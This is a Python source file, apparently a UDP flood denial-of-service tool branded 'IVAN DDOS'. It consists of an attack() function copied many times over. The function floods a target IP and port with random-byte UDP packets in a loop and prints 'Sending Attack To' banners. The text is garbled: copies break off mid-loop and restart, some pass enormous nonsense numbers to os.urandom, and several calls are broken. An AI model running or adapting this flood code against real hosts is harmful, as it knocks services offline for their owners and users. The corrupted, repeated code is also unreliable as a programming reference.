    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
